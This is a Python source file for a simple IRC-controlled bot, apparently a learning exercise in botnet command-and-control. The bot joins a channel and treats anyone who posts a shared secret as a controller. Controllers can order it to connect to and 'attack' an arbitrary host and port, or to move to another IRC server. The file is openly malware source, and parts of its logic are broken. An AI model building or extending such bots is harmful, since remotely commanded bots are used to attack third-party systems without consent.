# pylint: disable=C0103
# pylint: disable=C1001
# pylint: disable=R0903
# pylint: disable=C0301
# pylint: disable=C0325
#run irc server using!!!! sudo service inspircd start
import socket
import sys
import time
import os
import random

#slitly modifided code for spliting messages from server
def parsemsg(s):
    print(s)
    """Breaks a message from an IRC server into its sender, prefix, command, and arguments.
    """
    sender = ''
    prefixpar = ''
    trailing = []
    commandpar = ''
    if not s:
        print("no response from server")
    if s[0] == ':':
        prefixpar, s = s[1:].split(' ', 1)
        if prefixpar.find('!') != -1:
            sender, prefixpar = prefixpar.split("!", 1)
        else:
            sender = None
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        argspar = s.split()
        argspar.append(trailing)
    else:
        argspar = s.split()
    commandpar = argspar.pop(0)
    #print("sender:", sender)
    #print("commandpar:", commandpar)
    #print("args:", argspar)
    return sender, prefixpar, commandpar, argspar

#ping message
def isping(s, sock):
    """Breakdown the message to see if it is a ping message"""
    if s.find(' :') != -1:
        ping, rest = s.split(' :', 1)
        if ping == 'PING':
            print("a ping is found")
            pong = 'PONG :' + rest
            try:
                sock.send(pong.encode("utf-8"))
            except OSError:
                print("cannot return ping")
            return True
    else:
        return False

#needed variables to start
hostname = ''
port = 0
channel = ''
secret = ''

#function variables
poweruser = []
attackhost = ''
attackport = ''
botname = 'bot1'
attacknumber = 1

#runtime boolean
shutoff = False
isconnected = False
issocket = False
isname = False



if len(sys.argv) != 5:
    print("invalid input")

#get information from commandline
try:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    channel = '#' + sys.argv[3]
    secret = sys.argv[4]
    print(secret)
except ValueError:
    print("invalid input: ", sys.argv[2])

#set random
random.seed(os.urandom(5))

#connect to server
ircsocket = socket.socket()
socket.setdefaulttimeout(1000)

#this must be in a loop, if disconnected try again in 5 sec
while not shutoff:
    #loop until connected to irc server
    while not issocket:
        try:
            ircsocket.connect((socket.gethostbyname(hostname), port))
            issocket = True
            time.sleep(1)
        except socket.timeout:
            issocket = False
            time.sleep(5)
        except OSError:
            print("cannot connect to ircserver")
            issocket = False
            time.sleep(5)
    #loop until a user use the secret password
    if not isconnected:
        try:
            time.sleep(1)
            while not isname:
                ircsocket.send("NICK {}\r\n".format(botname).encode("utf-8"))
                ircsocket.send("USER {} 0 * {}\r\n".format(botname, botname).encode("utf-8"))
                while isname:
                    ircinput = ircsocket.recv(1024).decode("utf-8")
                    user, prefix, command, args = parsemsg(ircinput)
                    if command == "NOTICE\r\n":
                        if "Nickname is already in use" in args[1]:
                            print("botname failed:", botname)
                            botname = 'bot' + str(random.randint(0, 1000))
                            break
                        elif "Welcome" in args[1]:
                            isname = True
                            break
                        time.sleep(1)
            
            ircsocket.send("JOIN {}\r\n".format(channel).encode("utf-8"))
            print("JOIN {}\r\n".format(channel))
        except OSError:
            print("failed to connect to channel")
    try:
        ircinput = ircsocket.recv(1024).decode("utf-8")

        #check to see if input is a ping message, if not see if its one of the commands
        #args[0] is the channel
        #args[1] is the message
        if not isping(ircinput, ircsocket) and not ircsocket == -1:
            user, prefix, command, args = parsemsg(ircinput)
            #print('user: ', user)
            if len(args) < 2:
                pass

            #if secret is used, user is added to the list of super users
            elif secret in args[1]:
                if user not in poweruser:
                    poweruser.append(user)
                    print("found poweruser: ", user)

            #send a status message to all the super users
            elif args[1] == "status\r\n" and user in poweruser:
                try:
                    ircsocket.send("PRIVMSG {} :{}\r\n".format(user, botname).encode("utf-8"))
                    print("PRIVMSG {} :{}\r\n".format(user, botname).encode("utf-8"))
                except OSError:
                    print("failed to identify self")

            #attempt to attack the network
            elif "attack" in args[1] and user in poweruser:
                try:
                    #split the attack command
                    nouse, attackhost, attackport = args[1].split(' ')
                    print("attackhost:", attackhost)
                    print("attackport:", attackport)

                    #create socket
                    attacksocket = socket.socket()
                    attacksocket.connect((socket.gethostbyname(attackhost), int(attackport)))
                    attacksocket.send("{} {}".format(attacknumber, botname).encode("utf-8"))
                    isattack = True

                    #send response to user
                    ircsocket.send("PRIVMSG {} :attack sucessful\r\n".format(user).encode("utf-8"))
                except socket.timeout:
                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n".format(user).encode("utf-8"))
                except OSError:
                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n".format(user).encode("utf-8"))
                except ValueError:
                    print("not an attack command")
                print("attack is found")

            #move to a different channel
            elif "move" in args[1] and user in poweruser:
                try:
                    ircsocket.send("PRIVMSG {} :moving to new server\r\n".format(user).encode("utf-8"))
                    ircsocket.close()
                    ircsocket = socket.socket()
                    nouse, hostname, port, channel = args[1].split(' ')
                    channel = '#' + channel
                    issocket = False
                    isname = False
                    while not issocket:
                        ircsocket.connect((socket.gethostbyname(hostname), int(port)))
                        issocket = True
                        print("new connection is made")
                        time.sleep(3)
                except socket.timeout:
                    issocket = False
                    time.sleep(5)
                except OSError:
                    print("cannot connect to ircserver")
                    issocket = False
                    time.sleep(5)
                except ValueError:
                    print("move command wrong")
                print("move is found")

            #close this bot
            elif args[1] == "shutdown\r\n":
                shutoff = True
                break



    except OSError:
        print("failed to recive from socket")
        ircsocket = -1


    #wait for command from that user
    #if a command is issued carry it out



